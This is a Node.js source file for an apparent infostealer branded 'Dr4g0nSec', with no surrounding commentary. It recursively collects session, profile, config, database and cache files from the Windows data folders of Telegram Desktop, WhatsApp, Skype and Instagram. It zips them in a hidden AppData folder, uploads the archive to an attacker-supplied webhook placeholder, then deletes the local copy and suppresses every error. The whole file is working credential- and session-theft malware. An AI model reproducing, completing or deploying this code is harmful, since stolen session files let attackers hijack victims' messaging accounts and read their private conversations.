const fs = require("fs");
const path = require("path");
const os = require("os");
const archiver = require("archiver");
const axios = require("axios");
const FormData = require("form-data");

const H00K3_URL = "%WEBHOOK%";

const APP_TERMS = [
  'profile', 'config', 'session', 'log', 'db', 'cache', 'settings'
];

const APP_DIRS = [
  path.join(os.homedir(), 'AppData', 'Roaming', 'Telegram Desktop'),
  path.join(os.homedir(), 'AppData', 'Roaming', 'WhatsApp'),
  path.join(os.homedir(), 'AppData', 'Local', 'Packages', '5319275A.WhatsAppDesktop_cv1g1gvanyjgm'),
  path.join(os.homedir(), 'AppData', 'Roaming', 'Skype'),
  path.join(os.homedir(), 'AppData', 'Local', 'Packages', 'Facebook.InstagramBeta_8xx8rvfyw5nnt'),
];

function searchAppFiles(directories, terms) {
  const found = new Set();

  for (const dir of directories) {
    try {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        let stat;
        try {
          stat = fs.statSync(fullPath);
        } catch (_) {
          continue;
        }

        if (stat.isFile() && terms.some(t => entry.name.toLowerCase().includes(t))) {
          found.add(fullPath);
        } else if (stat.isDirectory()) {
          try {
            const subEntries = fs.readdirSync(fullPath);
            for (const sub of subEntries) {
              const subPath = path.join(fullPath, sub);
              try {
                const subStat = fs.statSync(subPath);
                if (
                  subStat.isFile() &&
                  terms.some(t => sub.toLowerCase().includes(t))
                ) {
                  found.add(subPath);
                }
              } catch (_) {
                continue;
              }
            }
          } catch (_) {
            continue;
          }
        }
      }
    } catch (_) {
      continue;
    }
  }

  return Array.from(found);
}

function createTempDir() {
  const tempDir = path.join(os.homedir(), "AppData", "Local", "SecInfos");
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
  return tempDir;
}

function createZip(files, outputPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outputPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", () => resolve(outputPath));
    output.on("error", err => reject(err));
    archive.on("error", err => reject(err));

    archive.pipe(output);

    files.forEach(file => {
      try {
        const relPath = path.relative(os.homedir(), file);
        archive.file(file, { name: relPath });
      } catch (_) {}
    });

    archive.finalize();
  });
}

async function sendToWebhook(zipPath, files) {
  const fileList = files.map(f => path.basename(f));
  const embedDescription = `<:pc2x:1378155924329336832> • **Arquivos de Apps encontrados:**\n` +
    fileList.slice(0, 15).map(f => `└─ ${f}`).join("\n") +
    (fileList.length > 15 ? "\n└─ ...e mais arquivos" : "");

  const embed = {
    title: "Dr4g0nSec | Apps Info",
    description: embedDescription,
    color: 15158332,
    footer: {
      text: "Created by sk4rty | Dr4g0nSec on Top!",
      icon_url: "https://avatars.githubusercontent.com/u/150484081?v=4"
    }
  };

  const form = new FormData();
  form.append("file", fs.createReadStream(zipPath));
  form.append("payload_json", JSON.stringify({
    username: "Dr4g0nSec | Apps Info",
    avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
    embeds: [embed]
  }));

  try {
    await axios.post(H00K3_URL, form, {
      headers: form.getHeaders(),
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });
  } catch (err) {
  }
}

function deleteFolderRecursive(folderPath) {
  if (fs.existsSync(folderPath)) {
    fs.readdirSync(folderPath).forEach(file => {
      const curPath = path.join(folderPath, file);
      if (fs.lstatSync(curPath).isDirectory()) {
        deleteFolderRecursive(curPath);
      } else {
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(folderPath);
  }
}

(async () => {
  const found = searchAppFiles(APP_DIRS, APP_TERMS);
  if (found.length === 0) return;

  const tempDir = createTempDir();
  const zipPath = path.join(tempDir, ".zip temporario");

  try {
    await createZip(found, zipPath);
    await sendToWebhook(zipPath, found);
    deleteFolderRecursive(tempDir);
  } catch (err) {
  }
})();
